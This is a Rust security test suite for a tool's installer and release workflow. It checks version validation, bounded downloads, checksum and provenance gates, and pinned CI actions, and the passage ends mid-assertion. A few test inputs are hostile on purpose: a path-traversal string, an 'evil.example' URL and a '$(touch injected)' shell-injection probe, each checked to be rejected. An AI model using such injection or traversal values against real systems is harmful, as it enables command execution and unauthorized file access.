//! S-Tier Security and Privilege Escalation Test Suite
//!
//! Comprehensive security testing covering:
//! - Privilege escalation (sudo, pkexec, capabilities)
//! - Security validation (input sanitization, path traversal)
//! - PGP/Signature verification
//! - SBOM/Audit integrity
//! - Attack scenario simulations
//!
//! Run: cargo test --test `security_privilege_escalation_tests`

#![expect(clippy::unwrap_used)]

use omg_lib::core::privilege::{PrivilegeChecker, SystemPrivilegeChecker};
use omg_lib::core::security::audit::{AuditEventType, AuditLogger, AuditSeverity};
#[cfg(feature = "pgp")]
use omg_lib::core::security::pgp::PgpVerifier;
use omg_lib::core::security::policy::{SecurityGrade, SecurityPolicy};
use omg_lib::core::security::secrets::{SecretScanner, SecretSeverity};
use omg_lib::core::security::slsa::{SlsaLevel, SlsaVerifier};
use omg_lib::core::security::validation::*;
use std::fs;
use tempfile::{NamedTempFile, TempDir};

// ═══════════════════════════════════════════════════════════════════════════
// 1. PRIVILEGE ESCALATION TESTS
// ═══════════════════════════════════════════════════════════════════════════

mod privilege_escalation {
    use std::io::Write as _;
    use std::process::{Command, Output, Stdio};

    const RELEASE_VERSION_CASES: &[(&str, bool)] = &[
        ("1.2.3", true),
        ("0.0.0", true),
        ("1.2.3-0", true),
        ("1.2.3-rc.1", true),
        ("1.2.3-01a", true),
        ("1.2.3+007", true),
        ("1.2.3+build.007", true),
        ("1.2.3-rc.1+007", true),
        ("1.2.3-01", false),
        ("1.2.3-rc.01", false),
        ("01.2.3", false),
        ("1.2.3.4", false),
        ("1.2.3-", false),
        ("1.2.3+", false),
        ("1.2.3-rc..1", false),
        ("v1.2.3", false),
    ];

    fn run_installer_functions(command: &str, env: &[(&str, &std::ffi::OsStr)]) -> Output {
        let installer = include_str!("../install.sh");
        let (definitions, _) = installer
            .rsplit_once("\nmain\n")
            .expect("installer must end with its main invocation");
        let script = format!("{definitions}\ntrap - EXIT\n{command}\n");
        let mut process = Command::new("bash");
        process
            .args(["--noprofile", "--norc"])
            .envs(env.iter().copied())
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let mut child = process.spawn().expect("bash must be available");
        child
            .stdin
            .take()
            .expect("piped stdin")
            .write_all(script.as_bytes())
            .expect("write installer test script");
        child.wait_with_output().expect("run installer test script")
    }

    #[test]
    fn release_version_installer_accepts_matching_bare_versions_and_tags() {
        for &(version, valid) in RELEASE_VERSION_CASES {
            assert_eq!(semver::Version::parse(version).is_ok(), valid);
            for command in [
                "validate_bare_version \"$CANDIDATE\"",
                "validate_version_tag \"v$CANDIDATE\"",
            ] {
                let output = run_installer_functions(
                    command,
                    &[("CANDIDATE", std::ffi::OsStr::new(version))],
                );
                assert_eq!(output.status.success(), valid, "{command}: {version}");
            }
        }
    }

    #[test]
    fn release_version_rollback_rejects_invalid_input_before_credentials() {
        let directory = tempfile::tempdir().expect("rollback fixture");
        let script =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("scripts/r2-rollback.sh");
        for &(version, valid) in RELEASE_VERSION_CASES {
            let output = Command::new("bash")
                .arg(&script)
                .arg(version)
                .env_clear()
                .current_dir(directory.path())
                .output()
                .expect("run rollback input validation without credentials");
            if valid {
                assert_eq!(output.status.code(), Some(1), "{version}");
                assert!(String::from_utf8_lossy(&output.stderr).contains("CLOUDFLARE_API_TOKEN"));
            } else {
                assert_eq!(output.status.code(), Some(65), "{version}");
            }
            assert!(!directory.path().join(".github").exists());
        }
    }

    #[test]
    fn release_version_notes_follow_the_same_semver_contract() {
        let (validation, _) = include_str!("../scripts/gen-release-notes.sh")
            .split_once("\nscript_dir=")
            .expect("release-note validation precedes content generation");
        for &(version, valid) in RELEASE_VERSION_CASES {
            let output = Command::new("bash")
                .args(["--noprofile", "--norc", "-c", validation, "--", version])
                .env_clear()
                .output()
                .expect("run release-note input validation");
            assert_eq!(output.status.success(), valid, "{version}");
        }
    }

    #[test]
    fn installer_marker_bounds_survive_curl_without_streaming_limits() {
        let directory = tempfile::tempdir().expect("marker fixture");
        let body_path = directory.path().join("body");
        for (case, body, valid) in [
            ("newline", b"1.2.3\n".to_vec(), true),
            (
                "at limit",
                [b"1.2.3".as_slice(), &[b'\n'; 251]].concat(),
                true,
            ),
            (
                "over limit",
                [b"1.2.3".as_slice(), &[b'\n'; 252]].concat(),
                false,
            ),
            ("NUL", b"1.2.\x003".to_vec(), false),
        ] {
            std::fs::write(&body_path, &body).expect("write marker body");
            let output = run_installer_functions(
                "curl() { cat \"$BODY\"; }\nOMG_VERSION=latest\nresolve_version",
                &[("BODY", body_path.as_os_str())],
            );
            assert_eq!(output.status.success(), valid, "{case}");
        }
    }

    #[test]
    fn installer_marker_rejects_a_failed_partial_transfer() {
        let output = run_installer_functions(
            "curl() { printf '1.2.3'; return 22; }\nOMG_VERSION=latest\nresolve_version",
            &[],
        );
        assert!(
            !output.status.success(),
            "failed transfer must not select a version"
        );
    }

    #[test]
    fn installer_file_bounds_survive_curl_without_streaming_limits() {
        for (stage, file, status, expected_bytes) in [
            ("archive", "fixture.tar.xz", 1, 33),
            ("checksum", "fixture.tar.xz.sha256", 2, 33),
            ("archive_failure", "fixture.tar.xz", 1, 0),
        ] {
            let directory = tempfile::tempdir().expect("download fixture");
            let body_path = directory.path().join("body");
            std::fs::write(&body_path, [b'x'; 4096]).expect("oversized response");
            let output = run_installer_functions(
                r#"
MAX_ARCHIVE_BYTES=32
MAX_CHECKSUM_BYTES=32
OMG_VERSION=v1.2.3
check_runtime_dependencies() { :; }
detect_os() { printf linux; }
detect_distro() { printf arch; }
detect_arch() { printf x86_64; }
select_artifact() { printf fixture.tar.xz; }
mktemp() { printf '%s\n' "$DIRECTORY"; }
cleanup_tmp_dir() { :; }
header() { :; }
info() { :; }
start_spinner() { :; }
stop_spinner() { :; }
fail_spinner() { :; }
fixture_body() {
  if [[ "$STAGE" == archive || "$1" == *.sha256 ]]; then
    cat "$BODY"
  else
    printf archive
  fi
}
curl() {
  if [[ "$STAGE" == archive_failure ]]; then return 22; fi
  local output='' url=''
  while (( $# )); do
    case "$1" in
      -o) output="$2"; shift 2 ;;
      --max-filesize) shift 2 ;;
      https://*) url="$1"; shift ;;
      *) shift ;;
    esac
  done
  if [[ -n "$output" ]]; then
    fixture_body "$url" > "$output"
  else
    fixture_body "$url"
  fi
}
install_from_release
"#,
                &[
                    ("BODY", body_path.as_os_str()),
                    ("DIRECTORY", directory.path().as_os_str()),
                    ("STAGE", std::ffi::OsStr::new(stage)),
                ],
            );
            assert_eq!(output.status.code(), Some(status), "{stage}");
            let bytes = std::fs::metadata(directory.path().join(file))
                .expect("downloaded candidate")
                .len();
            assert_eq!(bytes, expected_bytes, "{stage} candidate size");
        }
    }

    #[test]
    fn installer_maps_arch_derivatives_to_arch_artifacts() {
        let temp = tempfile::tempdir().expect("os-release fixture directory");
        let os_release = temp.path().join("os-release");
        std::fs::write(&os_release, "ID=omarchy\nID_LIKE=arch\n")
            .expect("write os-release fixture");

        let output = run_installer_functions(
            "detect_distro \"$OS_RELEASE_FIXTURE\"",
            &[("OS_RELEASE_FIXTURE", os_release.as_os_str())],
        );

        assert!(output.status.success(), "{:?}", output.status);
        assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "arch");
    }

    #[test]
    fn installer_artifact_selection_keeps_warnings_out_of_stdout() {
        let output = run_installer_functions("select_artifact v1.2.3 linux unknown x86_64", &[]);

        assert!(output.status.success(), "{:?}", output.status);
        assert_eq!(
            String::from_utf8_lossy(&output.stdout).trim(),
            "omg-v1.2.3-x86_64-linux-fedora.tar.gz"
        );
        assert!(String::from_utf8_lossy(&output.stderr).contains("Unknown Linux distro"));
    }

    #[test]
    fn installer_never_grants_file_capabilities() {
        let installer = include_str!("../install.sh");

        assert!(
            !installer.lines().any(|line| {
                let normalized = line.to_ascii_lowercase();
                normalized.contains("setcap") && normalized.contains("+ep")
            }),
            "the installer must not grant permanent file capabilities"
        );
        assert!(
            !installer.contains("cap_dac_override,cap_fowner,cap_chown"),
            "the legacy root-equivalent capability set must not return"
        );
    }

    #[test]
    fn installer_refuses_unpinned_remote_source_fallbacks() {
        let installer = include_str!("../install.sh");

        assert!(
            !installer.contains("git clone --depth 1 \"$REPO_URL\""),
            "the installer must not clone and execute unpinned repository HEAD"
        );
        assert!(
            installer.contains("refusing unverified installation or source fallback"),
            "a missing verified release must fail closed"
        );
    }

    #[test]
    fn installer_requires_gh_for_provenance_and_fails_closed() {
        let installer = include_str!("../install.sh");
        let start = installer
            .find("  if command -v gh >/dev/null 2>&1; then")
            .expect("provenance gate");
        let (gate, _) = installer[start..]
            .split_once("  start_spinner \"Extracting binaries\"")
            .expect("extraction boundary");
        for (present, status) in [(false, 0), (true, 0), (true, 1)] {
            let output = run_installer_functions(
                &format!(
                    "command() {{ return {}; }}\ngh() {{ return {status}; }}\nstart_spinner() {{ :; }}\nstop_spinner() {{ :; }}\nfail_spinner() {{ :; }}\nREPO_OWNER=owner\nREPO_NAME=name\nactual_version=v1.0.0\ndownload_file=fixture\nartifact_name=fixture\nverify_fixture() {{\n{gate}\n}}\nverify_fixture\n",
                    i32::from(!present)
                ),
                &[],
            );
            let expected = match (present, status) {
                (true, 0) => 0,
                (true, 1) => 2,
                _ => 1,
            };
            assert_eq!(
                output.status.code(),
                Some(expected),
                "present={present} status={status}: {}",
                String::from_utf8_lossy(&output.stdout)
            );
        }
        assert!(
            !installer.contains("OMG_INSTALL_ALLOW_UNVERIFIED_PROVENANCE"),
            "the provenance gate must not offer an unverified opt-out"
        );
    }

    #[test]
    fn installer_never_falls_back_after_a_verification_refusal() {
        for (status, source, accepted) in [
            (0, false, true),
            (1, true, true),
            (1, false, false),
            (2, false, false),
        ] {
            let output = run_installer_functions(
                &format!(
                    "print_banner() {{ :; }}\ninstall_from_release() {{ return {status}; }}\nIS_SOURCE_INSTALL={source}\ncheck_platform() {{ :; }}\ncheck_dependencies() {{ :; }}\nbuild_omg() {{ printf 'BUILT_SOURCE\\n'; }}\nsetup_config() {{ :; }}\nsetup_telemetry() {{ :; }}\nsetup_shell() {{ :; }}\nfinish() {{ :; }}\nmain\n"
                ),
                &[],
            );
            assert_eq!(
                output.status.success(),
                accepted,
                "status={status} source={source}: {}",
                String::from_utf8_lossy(&output.stdout)
            );
            if status == 2 {
                assert!(!String::from_utf8_lossy(&output.stdout).contains("BUILT_SOURCE"));
            }
        }
    }

    #[test]
    fn installer_requires_verified_release_checksums() {
        let installer = include_str!("../install.sh");

        assert!(
            installer.contains("Published checksum for ${artifact_name} is malformed"),
            "the installer must validate the sidecar digest shape"
        );
        assert!(
            installer.contains("does not match its published sha256"),
            "the installer must reject checksum mismatches"
        );
        assert!(
            installer.contains("refusing to install unverified binaries"),
            "a missing checksum must fail closed"
        );
        assert!(
            installer.contains("gh attestation verify \"$download_file\"")
                && installer.contains("Build provenance verification failed"),
            "the installer must fail closed on rejected provenance when GitHub CLI is available"
        );
    }

    #[test]
    fn release_collector_rejects_unexpected_artifacts() {
        use sha2::Digest as _;

        let temp = tempfile::tempdir().expect("release collector fixture directory");
        let artifacts = temp.path().join("artifacts");
        let release = temp.path().join("release");
        std::fs::create_dir(&artifacts).expect("artifact directory");

        let metadata = artifacts.join("release-metadata");
        std::fs::create_dir(&metadata).expect("release metadata directory");
        std::fs::write(
            metadata.join("omg-v1.2.3.cdx.json"),
            br#"{"bomFormat":"CycloneDX","specVersion":"1.5"}"#,
        )
        .expect("SBOM fixture");

        for platform in [
            "x86_64-linux-arch",
            "x86_64-linux-debian",
            "x86_64-linux-ubuntu",
            "x86_64-linux-fedora",
            "aarch64-darwin",
        ] {
            let directory = artifacts.join(platform);
            std::fs::create_dir(&directory).expect("platform artifact directory");
            let archive = format!("omg-v1.2.3-{platform}.tar.gz");
            let bytes = platform.as_bytes();
            std::fs::write(directory.join(&archive), bytes).expect("archive fixture");
            let digest = format!("{:x}", sha2::Sha256::digest(bytes));
            std::fs::write(
                directory.join(format!("{archive}.sha256")),
                format!("{digest}  {archive}\n"),
            )
            .expect("checksum fixture");
        }

        let script = format!(
            "{}/scripts/collect-release-artifacts.sh",
            env!("CARGO_MANIFEST_DIR")
        );
        let accepted = std::process::Command::new(&script)
            .args(["1.2.3"])
            .arg(&artifacts)
            .arg(&release)
            .status()
            .expect("release collector must execute");
        assert!(accepted.success(), "the exact release set must be accepted");

        std::fs::write(artifacts.join("unexpected.tar.gz"), b"unexpected")
            .expect("unexpected artifact fixture");
        let rejected = std::process::Command::new(script)
            .args(["1.2.3"])
            .arg(&artifacts)
            .arg(temp.path().join("rejected-release"))
            .status()
            .expect("release collector must execute");
        assert!(
            !rejected.success(),
            "an unexpected archive must fail the release allowlist"
        );
    }

    #[test]
    fn installer_scripts_pass_shell_syntax_check() {
        for relative in ["install.sh", "scripts/r2-rollback.sh"] {
            let script = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(relative);
            let status = std::process::Command::new("bash")
                .args(["-n"])
                .arg(&script)
                .status()
                .expect("bash must be available");
            assert!(
                status.success(),
                "{relative} must pass `bash -n` syntax checking"
            );
        }
    }

    #[test]
    fn installer_resolves_latest_only_from_the_r2_marker() {
        let installer = include_str!("../install.sh");

        assert!(
            installer.contains("RELEASES_BASE_URL=\"https://releases.omg.latham.cloud\""),
            "archives, sidecars, and the marker must come from the R2 release domain"
        );
        assert!(
            installer.contains("LATEST_VERSION_URL=\"${RELEASES_BASE_URL}/latest-version\""),
            "the installer must resolve latest from the authoritative R2 marker"
        );
        assert!(
            !installer.contains("api.github.com") && !installer.contains("browser_download_url"),
            "latest resolution must be R2-only: no GitHub release-metadata lookup, \n             which would undermine scripts/r2-rollback.sh rollback authority"
        );
        assert!(
            installer.contains("--max-filesize \"$MAX_LATEST_VERSION_BYTES\""),
            "the marker fetch must be bounded"
        );
        assert!(
            installer.contains("--max-filesize \"$MAX_ARCHIVE_BYTES\""),
            "the archive fetch must be bounded"
        );
        assert!(
            installer.contains("--max-filesize \"$MAX_CHECKSUM_BYTES\""),
            "the checksum fetch must be bounded"
        );
        assert!(
            installer.contains("asset_url=\"${RELEASES_BASE_URL}/${artifact_name}\""),
            "the archive URL must be constructed directly on the R2 release domain"
        );
    }

    struct FakeCurl(tempfile::TempDir);

    impl FakeCurl {
        fn new(fail: bool) -> Self {
            let dir = tempfile::tempdir().expect("fake curl directory");
            let script = if fail {
                "#!/bin/bash\nexit 1\n"
            } else {
                "#!/bin/bash\nprintf '%s\\n' \"$FAKE_MARKER\"\n"
            };
            std::fs::write(dir.path().join("curl"), script).expect("write fake curl");
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let mut permissions = std::fs::metadata(dir.path().join("curl"))
                    .expect("fake curl metadata")
                    .permissions();
                permissions.set_mode(0o755);
                std::fs::set_permissions(dir.path().join("curl"), permissions)
                    .expect("chmod fake curl");
            }
            Self(dir)
        }

        fn path_env(&self) -> String {
            format!(
                "{}:{}",
                self.0.path().display(),
                std::env::var("PATH").unwrap_or_default()
            )
        }
    }

    fn resolve_version(env: &[(&str, &std::ffi::OsStr)]) -> Output {
        run_installer_functions("resolve_version", env)
    }

    #[test]
    fn installer_resolves_bare_semver_marker_to_a_tag() {
        let fake_curl = FakeCurl::new(false);
        let output = resolve_version(&[
            ("OMG_VERSION", "latest".as_ref()),
            ("FAKE_MARKER", "0.1.215".as_ref()),
            ("PATH", fake_curl.path_env().as_ref()),
        ]);

        assert!(output.status.success(), "a bare semver marker must resolve");
        assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "v0.1.215");
    }

    #[test]
    fn installer_marker_parsing_tolerates_whitespace_and_pre_release() {
        let fake_curl = FakeCurl::new(false);
        for (marker, expected) in [
            ("  1.2.3\n\n", "v1.2.3"),
            ("1.2.3-rc.1+b5", "v1.2.3-rc.1+b5"),
        ] {
            let output = resolve_version(&[
                ("OMG_VERSION", "latest".as_ref()),
                ("FAKE_MARKER", marker.as_ref()),
                ("PATH", fake_curl.path_env().as_ref()),
            ]);
            assert!(
                output.status.success(),
                "marker {marker:?} must resolve, stderr: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), expected);
        }
    }

    #[test]
    fn installer_fails_closed_on_malformed_marker_bodies() {
        let fake_curl = FakeCurl::new(false);
        for marker in [
            "",
            "v0.1.215",
            "V0.1.215",
            "not-a-version",
            "1.2",
            "1.2.3.4",
            "1.2.3-01",
            "evil/../../etc",
            "https://evil.example/1.2.3",
        ] {
            let output = resolve_version(&[
                ("OMG_VERSION", "latest".as_ref()),
                ("FAKE_MARKER", marker.as_ref()),
                ("PATH", fake_curl.path_env().as_ref()),
            ]);
            assert!(
                !output.status.success(),
                "marker body {marker:?} must be rejected"
            );
            assert!(
                !String::from_utf8_lossy(&output.stderr).contains(marker) || marker.is_empty(),
                "untrusted marker bytes must not be echoed into errors"
            );
        }
    }

    #[test]
    fn installer_fails_closed_on_oversized_and_unavailable_marker() {
        let fake_curl = FakeCurl::new(false);
        let oversized = format!("1.2.3{}9.9.9", " ".repeat(260));
        let output = resolve_version(&[
            ("OMG_VERSION", "latest".as_ref()),
            ("FAKE_MARKER", oversized.as_ref()),
            ("PATH", fake_curl.path_env().as_ref()),
        ]);
        assert!(
            !output.status.success(),
            "an oversized marker body must be rejected"
        );

        let failing_curl = FakeCurl::new(true);
        let output = resolve_version(&[
            ("OMG_VERSION", "latest".as_ref()),
            ("PATH", failing_curl.path_env().as_ref()),
        ]);
        assert!(
            !output.status.success(),
            "an unavailable marker must fail closed"
        );
    }

    #[test]
    fn installer_enforces_downloaded_file_size_bounds() {
        let fixture = tempfile::NamedTempFile::new().expect("size fixture");
        std::fs::write(fixture.path(), b"1234").expect("write size fixture");

        let accepted = run_installer_functions(
            "check_file_size_bound \"$BOUND_FIXTURE\" 4 fixture",
            &[("BOUND_FIXTURE", fixture.path().as_os_str())],
        );
        assert!(accepted.status.success(), "a file at the limit must pass");

        let rejected = run_installer_functions(
            "check_file_size_bound \"$BOUND_FIXTURE\" 3 fixture",
            &[("BOUND_FIXTURE", fixture.path().as_os_str())],
        );
        assert!(
            !rejected.status.success(),
            "a file over the limit must fail"
        );
    }

    #[test]
    fn installer_exact_version_is_used_verbatim_without_the_marker() {
        let failing_curl = FakeCurl::new(true);
        let output = resolve_version(&[
            ("OMG_VERSION", "v0.1.214".as_ref()),
            ("PATH", failing_curl.path_env().as_ref()),
        ]);
        assert!(
            output.status.success(),
            "exact installs must not hit the marker"
        );
        assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "v0.1.214");

        for raw in ["1.2.3", "not-a-tag", "latest"] {
            let output = resolve_version(&[
                ("OMG_VERSION", raw.as_ref()),
                ("PATH", failing_curl.path_env().as_ref()),
            ]);
            assert!(
                !output.status.success(),
                "OMG_VERSION={raw:?} must not resolve when the marker is unavailable"
            );
        }
    }

    #[test]
    fn release_workflow_and_rollback_enforce_the_cache_control_contract() {
        let immutable = "--cache-control=\"public, max-age=31536000, immutable\"";
        let no_store = "--cache-control=\"no-store\"";

        let Some(workflow) = read_checkout_file(".github/workflows/release.yml") else {
            eprintln!(
                "skipping release.yml cache-control assertions: .github is not present in this checkout"
            );
            return;
        };
        let r2_job = workflow
            .split("  sync-r2:")
            .nth(1)
            .expect("R2 release job must exist");
        let (archives_region, marker_region) = r2_job
            .split_once("Upload latest-version marker")
            .expect("latest-version marker step must exist");

        assert!(
            archives_region.contains("release/omg-v*.tar.gz")
                && archives_region.contains("release/omg-v*.sha256"),
            "both archive and sidecar uploads must be covered by the immutable policy"
        );
        assert!(
            archives_region.matches(immutable).count() >= 2,
            "every archive and sidecar upload must be marked immutable"
        );
        assert!(
            !archives_region.contains(no_store),
            "only the mutable marker may be served with no-store"
        );
        assert!(
            marker_region.contains("omg-releases/latest-version")
                && marker_region.contains(no_store)
                && !marker_region.contains(immutable),
            "the mutable latest-version marker must never be cached"
        );

        let Some(rollback) = read_checkout_file("scripts/r2-rollback.sh") else {
            panic!("R2 rollback script must exist");
        };
        assert!(
            rollback.contains("omg-releases/latest-version") && rollback.contains(no_store),
            "the rollback marker publication must also be no-store"
        );
        assert!(
            !rollback
                .lines()
                .any(|line| { line.contains("--cache-control") && !line.contains("no-store") }),
            "rollback must never set an immutable cache policy"
        );
    }

    #[test]
    fn release_sync_requires_publication_permission_for_every_path() {
        let Some(workflow) = read_checkout_file(".github/workflows/release.yml") else {
            eprintln!("release workflow fixture is absent from this package");
            return;
        };
        let (_, job) = workflow.split_once("\n  sync-r2:\n").expect("R2 sync job");
        let (_, condition) = job.split_once("    if: >-\n").expect("job condition");
        let (condition, _) = condition.split_once("    steps:\n").expect("job steps");
        assert_eq!(
            condition.split_whitespace().collect::<Vec<_>>().join(" "),
            concat!(
                "${{ always() && ",
                "(github.event_name == 'push' || (github.event_name == 'workflow_dispatch' && inputs.dry_run == 'false')) && ",
                "(inputs.sync_existing_tag != '' || needs.release.result == 'success') }}"
            )
        );
    }

    fn release_workflow_script(step: &str) -> Option<String> {
        let workflow = read_checkout_file(".github/workflows/release.yml")?;
        let heading = format!("      - name: {step}\n");
        let (_, step) = workflow.split_once(&heading).expect("release step exists");
        let (_, body) = step
            .split_once("        run: |\n")
            .expect("shell body exists");
        Some(
            body.lines()
                .take_while(|line| line.is_empty() || line.starts_with("          "))
                .map(|line| line.strip_prefix("          ").unwrap_or(line))
                .collect::<Vec<_>>()
                .join("\n"),
        )
    }

    #[test]
    #[cfg(unix)]
    fn release_dispatch_values_are_data_not_shell_code() {
        use std::os::unix::fs::PermissionsExt as _;
        let Some(script) =
            release_workflow_script("Require successful CI and benchmark runs for this commit")
        else {
            eprintln!("release workflow fixture is absent from this package");
            return;
        };
        for value in ["true", "false", "$(touch injected)"] {
            let fixture = tempfile::tempdir().expect("gate fixture");
            let gate = fixture.path().join("scripts/require-workflow-success.sh");
            std::fs::create_dir(gate.parent().unwrap()).unwrap();
            std::fs::write(&gate, "#!/bin/sh\nprintf '%s\\n' \"$*\" >> gate-calls\n").unwrap();
            std::fs::set_permissions(&gate, std::fs::Permissions::from_mode(0o700)).unwrap();
            let rendered = script.replace("${{ inputs.dry_run }}", value);
            let output = Command::new("bash")
                .args([
                    "--noprofile",
                    "--norc",
                    "-e",
                    "-o",
                    "pipefail",
                    "-c",
                    &rendered,
                ])
                .env_clear()
                .env("PATH", std::env::var_os("PATH").expect("PATH"))
                .env("GITHUB_EVENT_NAME", "workflow_dispatch")
                .env("GITHUB_SHA", "fixture-commit")
                .env("GITHUB_REF", "refs/tags/v1.2.3")
                .env("DRY_RUN", value)
                .current_dir(fixture.path())
                .output()
                .expect("run gate fixture");
            assert!(
                output.status.success(),
                "{}",
                String::from_utf8_lossy(&output.stderr)
            );
            assert!(
                !fixture.path().join("injected").exists(),
                "dispatch value was executed as shell code"
            );
            let calls =
                std::fs::read_to_string(fixture.path().join("gate-calls")).unwrap_or_default();
            let expected = if value == "true" {
                Vec::new()
            } else {
                vec![
                    "ci.yml fixture-commit CI",
                    "benchmark.yml fixture-commit Benchmark",
                    "audit.yml fixture-commit Security Audit",
                    "secrets.yml fixture-commit Secret Scanning",
                    "codeql.yml fixture-commit CodeQL",
                    "coverage.yml fixture-commit Coverage",
                    "docker-e2e.yml fixture-commit Docker E2E",
                ]
            };
            assert_eq!(calls.lines().collect::<Vec<_>>(), expected);
        }
        assert!(
            read_checkout_file(".github/workflows/release.yml")
                .unwrap()
                .contains("DRY_RUN: ${{ inputs.dry_run }}")
        );
        assert!(!script.contains("${{ inputs.dry_run }}"));
    }

    #[test]
    fn release_remote_tag_check_accepts_annotated_and_lightweight_tags() {
        let Some(script) = release_workflow_script("Verify remote release tag") else {
            eprintln!("release workflow fixture is absent from this package");
            return;
        };
        let fixture = tempfile::tempdir().expect("tag fixture");
        let run = |script: &str, tag: &str, expected: &str| {
            Command::new("bash")
                .args([
                    "--noprofile",
                    "--norc",
                    "-e",
                    "-o",
                    "pipefail",
                    "-c",
                    script,
                ])
                .env_clear()
                .env("PATH", std::env::var_os("PATH").expect("PATH"))
                .env("HOME", fixture.path())
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("RELEASE_TAG", tag)
                .env("EXPECTED_COMMIT", expected)
                .current_dir(fixture.path())
                .output()
                .expect("run local tag fixture")
        };
        let setup = run(
            "git init -q\ngit config user.name Fixture\ngit config user.email fixture@example.invalid\ngit commit -q --allow-empty -m fixture\ngit tag v1.2.3\ngit tag -a v1.2.4 -m annotated\ngit tag -a v1.2.5 v1.2.4 -m nested\ngit remote add origin .\ngit rev-parse HEAD",
            "",
            "",
        );
        assert!(
            setup.status.success(),
            "{}",
            String::from_utf8_lossy(&setup.stderr)
        );
        let commit = String::from_utf8(setup.stdout).expect("commit output");
        let commit = commit.trim();
        for (tag, expected, valid) in [
            ("v1.2.3", commit, true),
            ("v1.2.4", commit, true),
            ("v1.2.5", commit, true),
            ("v9.9.9", commit, false),
            ("v1.2.4", "0000000000000000000000000000000000000000", false),
        ] {
            let output = run(&script, tag, expected);
            assert_eq!(
                output.status.success(),
                valid,
                "{tag}: {}",
                String::from_utf8_lossy(&output.stdout)
            );
        }
    }

    fn read_checkout_file(relative: &str) -> Option<String> {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(relative);
        match std::fs::read_to_string(&path) {
            Ok(content) => Some(content),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => None,
            Err(error) => panic!("failed to read {}: {error}", path.display()),
        }
    }

    #[test]
    fn dependency_and_workflow_updates_fail_closed() {
        let deny = include_str!("../deny.toml");
        assert!(
            deny.contains("yanked = \"deny\""),
            "yanked locked dependencies must fail cargo-deny"
        );

        let Some(renovate_src) = read_checkout_file(".github/renovate.json") else {
            eprintln!("skipping renovate.json assertions: .github is not present in this checkout");
            return;
        };
        let renovate: serde_json::Value =
            serde_json::from_str(&renovate_src).expect("Renovate configuration must be JSON");
        let action_rule = renovate["packageRules"]
            .as_array()
            .expect("package rules")
            .iter()
            .find(|rule| {
                rule["matchManagers"]
                    .as_array()
                    .is_some_and(|items| items.iter().any(|item| item == "github-actions"))
            })
            .expect("GitHub Actions update rule");
        assert_eq!(action_rule["automerge"], false);
        assert_eq!(action_rule["minimumReleaseAge"], "7 days");

        let workflows = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(".github/workflows");
        for entry in std::fs::read_dir(workflows).expect("workflow directory") {
            let path = entry.expect("workflow entry").path();
            if path.extension().and_then(std::ffi::OsStr::to_str) != Some("yml") {
                continue;
            }
            let source = std::fs::read_to_string(&path).expect("workflow source");
            for line in source.lines() {
                let trimmed = line.trim();
                let Some(action) = trimmed
                    .strip_prefix("- uses: ")
                    .or_else(|| trimmed.strip_prefix("uses: "))
                else {
                    continue;
                };
                if action.starts_with("./") {
                    continue;
                }
                let reference = action
                    .split_once('@')
                    .map(|(_, reference)| reference)
                    .expect("external actions must have a reference")
                    .split_whitespace()
                    .next()
                    .expect("action reference");
                assert!(
                    reference.len() == 40
                        && reference
                            .chars()
                            .all(|character| character.is_ascii_hexdigit()),
                    "{} has a mutable action reference: {action}",
                    path.display()
                );
            }
        }

        let Some(audit) = read_checkout_file(".github/workflows/audit.yml") else {
            eprintln!("skipping audit.yml assertions: .github is not present in this checkout");
            return;
        };
        assert!(
            audit.contains("cargo tree --locked --depth 3"),
            "dependency evidence must be generated from the reviewed lockfile"
        );
    }

    #[test]
    fn benchmark_code_runs_without_repository_write_credentials() {
        let Some(workflow) = read_checkout_file(".github/workflows/benchmark.yml") else {
            eprintln!("skipping benchmark.yml assertions: .github is not present in this checkout");
            return;
        };
        let (benchmark_job, review_job) = workflow
            .split_once("  commit-results:")
            .expect("benchmark history preparation must be isolated");
        assert!(
            benchmark_job.contains("permissions:\n  contents: read"),
            "benchmark scripts must run under a read-only token"
        );
        assert!(
            review_job.contains("permissions:\n      contents: read")
                && review_job.contains("persist-credentials: false"),
            "history preparation must also use a read-only token without persisted credentials"
        );
        assert!(
            !workflow.contains("contents: write")
                && !workflow.contains("git push")
                && !workflow.contains("secrets.GITHUB_TOKEN"),
            "benchmark jobs must not receive write credentials or bypass main review rules"
        );
        assert!(
            review_job.contains("actions/upload-artifact@")
                && review_job.contains("benchmark-history-for-review")
                && review_job.contains("if-no-files-found: error"),
            "generated history must remain available as a required review artifact"
        );
        assert!(
            !workflow.contains("credential.helper"),
            "workflow must rely on checkout-managed credentials, not persistent token helpers"
        );
    }

    #[test]
    fn release_archives_are_attested_before_approved_r2_promotion() {
        let Some(workflow) = read_checkout_file(".github/workflows/release.yml") else {
            eprintln!("skipping release.yml assertions: .github is not present in this checkout");
            return;
        };
        assert!(
            workflow.contains("actions/attest-build-provenance@")
                && workflow.contains("release/*.tar.gz")
                && workflow.contains("release/*.cdx.json")
                && workflow.contains("cargo-cyclonedx@0.5.9")
                && workflow.contains("attestations: write")
                && workflow.contains("id-token: write"),
            "published archives must receive GitHub/Sigstore provenance with minimal required permissions"
        );
        let publish_release = workflow
            .find("softprops/action-gh-release@")
            .expect("verified artifacts must be published to a GitHub Release");
        let attestation = workflow
            .find("actions/attest-build-provenance@")
            .expect("release attestation step must exist");
        assert!(
            attestation < publish_release,
            "release artifacts must be attested before GitHub publication"
        );

        let r2_job = workflow
            .split("  sync-r2:")
            .nth(1)
            .expect("R2 release job must exist");
        assert!(
            r2_job.contains("environment: production"),
            "R2 promotion must pass through the protected production environment"
        );
        let round_trip = r2_job
            .find("Verify round-trip integrity of uploaded objects")
            .expect("R2 uploads must be verified after publication");
        let latest_marker = r2_job
            .find("Upload latest-version marker")
            .expect("R2 promotion marker step must exist");
        assert!(
            round_trip < latest_marker,
